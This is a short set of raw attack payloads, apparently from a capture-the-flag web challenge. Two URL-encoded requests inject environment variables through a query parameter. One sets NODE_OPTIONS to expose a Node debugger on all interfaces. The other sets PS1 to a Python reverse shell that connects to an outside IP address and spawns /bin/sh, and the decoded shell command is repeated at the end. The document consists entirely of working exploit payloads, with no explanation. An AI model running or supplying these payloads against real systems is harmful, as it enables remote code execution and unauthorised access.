http://challenge.p6.is/0/?p[]=NODE%5FOPTIONS%3D%22%2D%2Dinspect%3D0%2E0%2E0%2E0%3A22473%22&file=/usr/bin/node
http://challenge.p6.is/0/?p[]=PS1%3D%24%28python%20%2Dc%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%223%2E23%2E201%2E37%22%2C18301%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%29%3B%27%29&file=/bin/sh

PS1=$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.23.201.37",18301));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') /bin/sh

